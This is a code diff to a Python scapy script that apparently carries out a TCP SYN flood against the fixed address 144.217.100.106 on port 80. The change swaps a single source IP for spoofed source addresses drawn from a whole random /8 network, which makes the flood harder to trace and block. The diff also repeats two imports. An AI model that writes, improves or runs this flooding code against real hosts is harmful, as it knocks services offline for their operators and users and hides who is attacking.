@@ -5,12 +5,23 @@ from scapy.all import *
 from queue import Queue
 import multiprocessing
 import os
+import random
+import ipaddress
+import ipaddress
+import random
+
 no_of_process = 12
 q = Queue()
 
 def launch():
-    p = (IP(src="35.225.200.175", dst="144.217.100.106") / TCP(dport=80,flags="S"))
-    send(p, count=20000)
+    block1 = random.randint(1, 125)
+    block1 = str(block1)
+    ip_network = block1 + ".0.0.0/8"
+    net4 = ipaddress.ip_network(ip_network)
+    for ip in net4:
+        x = str(ip)
+        p = (IP(src=x, dst="144.217.100.106") / TCP(dport=80,flags="S"))
+        send(p, count=20)
 
 
 NUMBER_OF_WORKERS = 5
